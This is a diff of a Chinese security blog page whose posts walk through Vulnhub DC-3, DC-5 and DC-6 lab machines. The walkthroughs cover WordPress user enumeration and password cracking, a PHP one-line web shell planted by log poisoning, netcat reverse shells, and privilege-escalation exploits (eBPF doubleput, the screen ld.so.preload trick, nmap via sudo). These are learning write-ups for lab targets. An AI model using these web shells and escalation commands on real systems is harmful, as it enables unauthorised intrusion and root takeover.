+<ul>
+<li><p>获取信息</p>
+<p>获取版本信息</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720213332.png" alt></p>
+</li>
+<li><p>搜索相关系统漏洞尝试提权</p>
+<p>参考： <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a></p>
+<p>然后我参照大佬的选用了本地拒绝服务漏洞提权</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720214214.png" alt></p>
+<p>如果要复现漏洞需要检查版本，用户权限</p>
+<p>将提权下载到本地，编译后，使用wget下载，这个下载了好久才下载好</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235102.png" alt></p>
+</li>
+</ul>
+<p>  之后就是按步骤走了</p>
+<p>  下载两个文件<br>  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar xf exploit.tar  </span><br><span class="line">cd ebpf_mapfd_doubleput_exploit  </span><br><span class="line">./compile.sh  </span><br><span class="line">./doubleput</span><br></pre></td></tr></table></figure></p>
+<p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190720235919.png" alt></p>
+<ul>
+<li><p>提权成功</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000019.png" alt></p>
+</li>
+<li><p>获取flag</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/20/20190721000242.png" alt></p>
+</li>
+</ul>
+<h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>​    这次花费了大量的时间调试，对于各种问题的解决方式有待提高，今日份的靶机奉上，本靶机只适合学习不要将其中的技术用于其他途径。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub靶机之DC-3/" data-id="ck1avz65m000facv4v97xr6hu" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/joomla-cms-注入/">joomla cms 注入</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ubuntu-16-04-bpf-提权/">ubuntu 16.04 bpf 提权</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Vulnhub 之 DC-6 靶机复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub 之 DC-6 靶机复现/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.042Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/Vulnhub 之 DC-6 靶机复现/">Vulnhub 之 DC-6 靶机复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="Vulnhub-之-DC-6-靶机复现"><a href="#Vulnhub-之-DC-6-靶机复现" class="headerlink" title="Vulnhub 之 DC-6 靶机复现"></a>Vulnhub 之 DC-6 靶机复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><strong>本靶机仅供学习使用，请不要用于其他路径，作者不承担任何法律责任</strong></p>
+<p>终于打到dc的最后一个靶机了，花了几个月的闲暇时间来试试，越到后面靶机的难度就会越来越大。所以也参考了一个资料 ，善于使用搜索引擎对您的学习很有进步。</p>
+<h2 id="靶机描述"><a href="#靶机描述" class="headerlink" title="靶机描述"></a>靶机描述</h2><p>按例做一个描述，获取一些关于靶机的提示，这对你如何去拿下它有很大的帮助</p>
+<p>下载地址：<a href="http://www.five86.com/dc-4.html" target="_blank" rel="noopener">DC-6</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">获取有用的信息，这可能是爆破的密码</span><br><span class="line">cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kali: 192.168.248.130</span><br><span class="line">DC-6: 192.168.248.145</span><br></pre></td></tr></table></figure>
+
+<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><ul>
+<li><p>获取ip和端口</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 网段</span><br><span class="line">nmap -sS ip</span><br></pre></td></tr></table></figure>
+
+<p>开启了22和80端口</p>
+</li>
+</ul>
+<ul>
+<li><p>这里访问会跳转到wordy，但是访问失败需要手动绑定。之前的环境也出现过相同的问题</p>
+<p>打开发现是wordpress的cms ，使用wpscan扫描用户，这个在之前的DC-2也同样使用过</p>
+<p>安装参考：<a href="https://www.freebuf.com/sectool/174663.html" target="_blank" rel="noopener">https://www.freebuf.com/sectool/174663.html</a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查找网站上所有的用户</span><br><span class="line">wpscan --url http://wordy/ -e</span><br><span class="line">这边使用的kali 可能会出现无法更新的情况，在请问大佬后给出了 apt-get upgrate 通过更新源去更新wpscan，这样也能达到同样的效果</span><br></pre></td></tr></table></figure>
+
+
+
+
+</li>
+</ul>
+<p>  成功获取到了5个用户</p>
+<p>  <img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805093436.png" alt></p>
+<ul>
+<li><p>爆破</p>
+<p>接下来就是爆破密码了，根据我们获得的提示，生成字典</p>
+<p><code>cat rockyou.txt | grep k01 &gt; passwords.txt</code></p>
+<p>之后使用wpscan 去爆破 获取到一个用户名和密码：mark/helpdesk01s</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805102249.png" alt></p>
+<p>后台地址：</p>
+<p><a href="http://wordy/wp-login.php" target="_blank" rel="noopener">http://wordy/wp-login.php</a></p>
+</li>
+<li><p>全局查看 </p>
+<p>没有发现有用的信息，查看插件发现存在 Activity monitor，搜索 发现存在远程命令执行的漏洞</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805103952.png" alt></p>
+</li>
+<li><p>接下来就是使用它去</p>
+<p><a href="https://www.exploit-db.com/exploits/45274" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/45274</a> 这里给出一个脚本的链接</p>
+<p>我们需要修改他里面的nc  就可以反弹shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805104847.png" alt></p>
+<p>​    或者使用burp</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110533.png" alt></p>
+<p>都可以反弹到shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805110758.png" alt></p>
+</li>
+<li><p>提权</p>
+<p>在mark目录下发现stuff 得到用户，切换用户</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111207.png" alt></p>
+<p>发现sudo权限</p>
+<p>尝试利用提权，这里可以修改拿到jens的权限</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805111859.png" alt></p>
+<p>继续深入 发现用户存在nmap的权限</p>
+<p>搜索 发现nmap提权方式 </p>
+<p>通过root权限执行nmap 然后nmap 去执行脚本， 获取root权限</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190805112828.png" alt></p>
+<p>之后就是root 权限了， 接下来就是 看看flag</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/8/3/20190806094954.png" alt></p>
+</li>
+</ul>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub 之 DC-6 靶机复现/" data-id="ck1avz65o000hacv4i04hq5a6" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/提权/">提权</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-Vulnhub 之 DC-5 靶机复现" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/10/04/Vulnhub 之 DC-5 靶机复现/" class="article-date">
+  <time datetime="2019-10-03T16:00:18.041Z" itemprop="datePublished">2019-10-04</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/靶机/">靶机</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2019/10/04/Vulnhub 之 DC-5 靶机复现/">DC-5 复现</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>[TOC]</p>
+<h1 id="Vulnhub-之-DC-5-靶机复现"><a href="#Vulnhub-之-DC-5-靶机复现" class="headerlink" title="Vulnhub 之 DC-5 靶机复现"></a>Vulnhub 之 DC-5 靶机复现</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本靶机只做学习使用，不要将其利用于非法途径。</p>
+<p>终于来到了倒数第二关，这一关将难度增加，所以我们需要借助搜索工具来帮助我们完成</p>
+<h2 id="作者描述"><a href="#作者描述" class="headerlink" title="作者描述"></a>作者描述</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">DC-5是另一个专门建造的脆弱实验室，目的是获得渗透测试领域的经验。</span><br><span class="line"></span><br><span class="line">这个计划是为了让DC-5更上一层楼，所以这对初学者来说可能不太好，但对有中级或更好经验的人来说应该没问题。时间会证明一切(反馈也会证明)。</span><br><span class="line"></span><br><span class="line">据我所知，只有一个可利用的入口点可以进入(也没有SSH)。这个特定的入口点可能很难识别，但它就在那里。你需要寻找一些有点不寻常的东西(随着页面刷新而改变的东西)。这将有希望提供一些关于漏洞可能涉及到什么的想法。</span><br><span class="line"></span><br><span class="line">请注意，这里不涉及phpmailer漏洞。:-)</span><br><span class="line"></span><br><span class="line">这一挑战的最终目标是找到根，阅读唯一的旗帜。</span><br><span class="line"></span><br><span class="line">必须具备Linux技能和熟悉Linux命令行，就像一些基本渗透测试工具的经验一样。</span><br></pre></td></tr></table></figure>
+
+<h2 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h2><p>kali： 192.168.248.130</p>
+<p>DC-5 : 192.168.248.142</p>
+<h2 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h2><ul>
+<li>还是老套路扫网段，扫端口。拿到ip：192.168.248.142 开了两个端口：80和111</li>
+</ul>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723183828.png" alt></p>
+<ul>
+<li><p>目录遍历</p>
+<p>访问这些网站，试图寻找新的东西</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723195951.png" alt></p>
+</li>
+<li><p>查看网站</p>
+<p>在concat.php 发现了输入栏</p>
+<p>看到输入框就测测sql注入，xss</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723185409.png" alt></p>
+<p>发现在url处返回了<a href="http://192.168.248.142/thankyou.php?firstname=1&amp;lastname=1&amp;country=other&amp;subject=1" target="_blank" rel="noopener">http://192.168.248.142/thankyou.php?firstname=1&amp;lastname=1&amp;country=other&amp;subject=1</a></p>
+</li>
+<li><p>文件包含</p>
+<p>发现<code>foster 包含的copyright 20xx</code> 是会变化的</p>
+<p>php在底部调用了footer.php 可能存在本地文件包含，尝试file=xxx测试</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723201552.png" alt></p>
+</li>
+</ul>
+<ul>
+<li><p>利用文件包含获取shell</p>
+<p>由于网站会记录url日志，写一句话进去，访问获取shell</p>
+<p><code>&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;</code></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205437.png" alt></p>
+<p>访问日志，并执行nc命令，获取到shell</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723205339.png" alt></p>
+</li>
+<li><p>借用提权工具</p>
+<p>LinEnum.sh 获取到了提权操作</p>
+<p>发现 guid 处存在可以文件</p>
+<p>搜索发现提权思路</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723212545.png" alt></p>
+<p>参考：<a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41154</a></p>
+<p>先编译后上传执行</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure>
+
+<p>通过wget上传</p>
+<p>之后执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;[+] Now we create our /etc/ld.so.preload file...&quot;</span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  &quot;\x0a/tmp/libhax.so&quot; # newline needed</span><br><span class="line">echo &quot;[+] Triggering...&quot;</span><br><span class="line">screen -ls # screen itself is setuid, so...</span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723214526.png" alt></p>
+</li>
+</ul>
+<h2 id="查看flag"><a href="#查看flag" class="headerlink" title="查看flag"></a>查看flag</h2><p>在root目录下</p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/7/23/20190723223011.png" alt></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/10/04/Vulnhub 之 DC-5 靶机复现/" data-id="ck1avz65l000bacv4o81lua1s" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/suid提权/">suid提权</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/本地文件包含/">本地文件包含</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+
+
+  <nav id="page-nav">
+    
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">Next &raquo;</a>
+  </nav>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/WEB安全/">WEB安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/">Web安全</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/Web安全/sql注入/">sql注入</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/shell/">shell</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/实用技术/">实用技术</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/靶机/">靶机</a></li></ul>
     </div>
   </div>
-</div>
 
-      
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Suid-提权/">Suid 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git提权/">git提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http方法利用/">http方法利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/joomla-cms-注入/">joomla cms 注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suid提权/">suid提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu-16-04-bpf-提权/">ubuntu 16.04 bpf 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/提权/">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件删除/">文件删除</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/时间盲注/">时间盲注</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/本地文件包含/">本地文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/语法/">语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程文件包含/">远程文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/错误解决方案/">错误解决方案</a></li></ul>
     </div>
   </div>
-</div>
 
-<!-- Pagination -->
-<div class="container">
-  <div class="row">
-    <div class="col-lg-10 col-md-10 col-md-offset-1">
-      <ul class="pagination">
-          
-          
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 20px;">DVWA</a> <a href="/tags/Suid-提权/" style="font-size: 10px;">Suid 提权</a> <a href="/tags/git提权/" style="font-size: 10px;">git提权</a> <a href="/tags/http方法利用/" style="font-size: 10px;">http方法利用</a> <a href="/tags/joomla-cms-注入/" style="font-size: 10px;">joomla cms 注入</a> <a href="/tags/js反弹shell/" style="font-size: 10px;">js反弹shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/suid提权/" style="font-size: 10px;">suid提权</a> <a href="/tags/ubuntu-16-04-bpf-提权/" style="font-size: 10px;">ubuntu 16.04 bpf 提权</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件删除/" style="font-size: 10px;">文件删除</a> <a href="/tags/时间盲注/" style="font-size: 10px;">时间盲注</a> <a href="/tags/本地文件包含/" style="font-size: 10px;">本地文件包含</a> <a href="/tags/杂项/" style="font-size: 20px;">杂项</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/语法/" style="font-size: 10px;">语法</a> <a href="/tags/远程命令执行/" style="font-size: 10px;">远程命令执行</a> <a href="/tags/远程文件包含/" style="font-size: 10px;">远程文件包含</a> <a href="/tags/错误解决方案/" style="font-size: 10px;">错误解决方案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
+          </li>
+        
       </ul>
     </div>
   </div>
-</div>
 
-
-
-    <!-- Footer -->
-<footer>
-  <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
-        <p class="copyright text-muted">
-          Theme By <a target="_blank" href="https://github.com/levblanc">Levblanc.</a>
-          Inspired By <a target="_blank" href="https://github.com/klugjo/hexo-theme-clean-blog">Clean Blog.</a>
-        <p class="copyright text-muted">
-          Powered By <a target="_blank" href="https://hexo.io/">Hexo.</a>
-        </p>
+  
+</aside>
+        
       </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
 </footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
 
 
-    <!-- After Footer Scripts -->
-<script src="/js/highlight.pack.js"></script>
-<script>
-  document.addEventListener("DOMContentLoaded", function(event) {
-    var codeBlocks = Array.prototype.slice.call(document.getElementsByTagName('pre'))
-    codeBlocks.forEach(function(block, index) {
-      hljs.highlightBlock(block);
-    });
-  });
-</script>
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
 
-  </body>
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
 </html>
-
